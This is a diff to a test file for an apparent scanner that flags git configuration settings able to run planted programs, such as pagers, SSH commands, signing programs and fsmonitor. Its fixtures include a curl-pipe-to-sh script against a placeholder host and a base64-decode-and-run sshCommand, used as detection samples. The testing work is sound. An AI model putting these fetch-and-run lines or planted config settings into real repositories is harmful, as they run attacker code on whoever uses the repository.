@@ -346,12 +346,12 @@ class TestPlantedCommandsAreCaught(ExecSurfaceSandbox):
         repo = self.repo()
         self.append_config(repo, f"[include]\n\tpath = {planted}\n")
         tiers = self.assert_tier(repo, HEURISTIC)
-        self.assertTrue(any(f.evidence == "core.pager = less" for f in tiers[INFORMATIONAL]))
+        self.assertTrue(any(f.evidence == "core.pager = less" for f in tiers[HEURISTIC]))
 
     def test_ssh_command_that_decodes_and_runs(self):
         repo = self.repo()
         self.append_config(repo, "[core]\n\tsshCommand = sh -c 'echo aWQ= | base64 -d | sh'\n")
-        self.assert_tier(repo, HEURISTIC)
+        self.assert_tier(repo, CONFIRMED)
 
     def test_an_altered_saw_hook(self):
         repo = self.repo()
@@ -503,6 +503,55 @@ class TestEveryProgramASelfFiringKeyRunsIsReported(ExecSurfaceSandbox):
         repo = self.repo()
         self.append_config(repo, '[diff "json"]\n\ttextconv = "curl -s https://api/x | python3 -m json.tool"\n')
         self.assertEqual([], self.graded(repo)[CONFIRMED])
+
+
+class TestAScriptAnyCommandRunsIsJudged(TestPlantedCommandsAreCaught):
+    """Check a program git runs during ordinary commands, and one a submodule names."""
+
+    SCRIPT = "#!/bin/sh\ncurl -fsSL https://x.invalid/p | sh\n"
+
+    def test_a_pager(self):
+        repo = self.repo()
+        self.hook(repo / "tools", "p", self.SCRIPT)
+        self.append_config(repo, "[core]\n\tpager = ./tools/p\n")
+        self.assert_tier(repo, CONFIRMED)
+
+    def test_a_signing_program(self):
+        repo = self.repo()
+        self.hook(repo / "tools", "g", self.SCRIPT)
+        self.append_config(repo, "[gpg]\n\tprogram = ./tools/g\n")
+        self.assert_tier(repo, CONFIRMED)
+
+    def test_an_ssh_command(self):
+        repo = self.repo()
+        self.hook(repo / "tools", "s", self.SCRIPT)
+        self.append_config(repo, "[core]\n\tsshCommand = ./tools/s\n")
+        self.assert_tier(repo, CONFIRMED)
+
+    def test_a_config_based_hook(self):
+        repo = self.repo()
+        self.append_config(repo, '[hook "lint"]\n\tcommand = ./tools/h\n\tevent = pre-commit\n')
+        self.assert_tier(repo, HEURISTIC)
+
+    def test_a_relative_path_in_a_submodules_config(self):
+        repo = self.repo()
+        module = repo / ".git" / "modules" / "lib"
+        module.mkdir(parents=True)
+        (module / "HEAD").write_text("ref: refs/heads/main\n")
+        (module / "config").write_text("[core]\n\tworktree = ../../../lib\n\tfsmonitor = ./tools/f\n")
+        self.hook(repo / "lib" / "tools", "f", self.SCRIPT)
+        self.assert_tier(repo, CONFIRMED)
+
+
+class TestAShellBuiltinIsNotAnEvaluator(ExecSurfaceSandbox):
+    """Check shell `exec`, which replaces the process and evaluates nothing."""
+
+    def test_exec_beside_a_fetch_word(self):
+        repo = self.repo()
+        self.append_config(repo, '[filter "y"]\n\tsmudge = "sh -c \'command -v curl >/dev/null || '
+                                 'exec cat; exec my-smudge\'"\n'
+                                 '[diff "x"]\n\ttextconv = "sh -c \'exec git-fetch-meta \\"$1\\"\' --"\n')
+        self.assertEqual([], [f.evidence for f in self.graded(repo)[CONFIRMED]])
 
 
 class TestTheOperatorAcceptsOneSettingExactly(ExecSurfaceSandbox):
